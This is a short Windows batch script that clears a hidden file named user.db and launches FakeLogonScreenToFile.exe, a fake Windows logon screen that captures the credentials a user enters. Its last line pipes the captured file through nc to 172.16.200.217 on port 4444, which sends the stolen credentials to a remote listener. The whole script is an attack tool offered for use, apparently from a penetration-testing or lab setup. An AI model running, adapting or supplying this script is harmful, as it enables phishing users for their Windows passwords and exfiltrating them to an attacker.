@echo off

if exist "%LOCALAPPDATA%\Microsoft\user.db" /a:hs (
	del "%LOCALAPPDATA%\Microsoft\user.db" /a:hs

)

start /wait "" "C:\Users\%USERPROFILE%\Desktop\fakelogonscreen_trunk\FakeLogonScreenToFile.exe"
type "%LOCALAPPDATA%\Microsoft\user.db" | nc 172.16.200.217 4444
 
